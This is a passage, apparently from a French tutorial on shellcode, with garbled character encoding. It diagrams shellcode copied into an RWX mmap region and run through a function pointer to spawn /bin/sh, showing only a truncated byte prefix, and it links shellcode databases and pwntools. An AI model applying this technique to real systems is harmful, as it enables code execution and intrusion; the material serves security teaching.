MÃ‰MOIRE PENDANT L'EXÃ‰CUTION :

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  HEAP (via mmap)                     â”‚
â”‚  Permission : RWX                    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  0x700000:                           â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚ Shellcode copiÃ©                â”‚  â”‚
â”‚  â”‚ \x48\x31\xc0\x50...            â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
       â†‘
  func pointe ici

func() â†’ CPU exÃ©cute le shellcode
      â†’ execve("/bin/sh")
      â†’ Shell lancÃ©
```

## Ressources

- [Shellcoding Tutorial](https://www.exploit-db.com/docs/english/13019-shell-storm-shellcode-database.pdf)
- [Shellcode Database](http://shell-storm.org/shellcode/)
- [Pwntools](https://github.com/Gallopsled/pwntools)

